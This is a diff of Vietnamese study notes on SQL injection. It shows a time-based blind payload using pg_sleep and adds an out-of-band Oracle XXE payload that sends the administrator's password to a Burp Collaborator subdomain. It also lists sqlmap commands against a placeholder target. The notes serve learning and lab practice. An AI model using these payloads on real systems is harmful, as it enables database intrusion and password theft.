@@ -46,6 +46,7 @@ SQL injection (SQLi) là một kỹ thuật tấn công mạng nguy hiểm, tron
 2. Time-based
 - Nếu server có chức năng chặn nhiều request mà sai nhiều lần đến thì sao? ta sẽ sử dụng 1 kỹ thuật tìm time trả về của request, ý tưởng ở đây là sẽ chuyển ký tự sang mã ascii để gắn vào hàm sleep từ đó ta dựa vào time để tìm đáp án, tuy nhiên đây sẽ có sai số vì còn dựa vào đường truyền, vị trí.... nên có thể ảnh hưởng rất nhiều đến thời gian trả về nên kỹ thuật này không được áp dụng nhiều (ta có thể sử dụng trung bình cộng của khoảng 100 request để tìm thời gian nhưng chỉ là tương đối)
 payload: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,a,1)='1')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
+payload OFB: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
 ### Sài TooL SQLMAP
 - Liệt kê database `sqlmap -u "http://target.com/page.php?id=1" --dbs --batch` -> vd name_db product
 - Liệt kê bảng trong database `sqlmap -u "http://target.com/page.php?id=1" -D product --tables --batch` -> bảng users
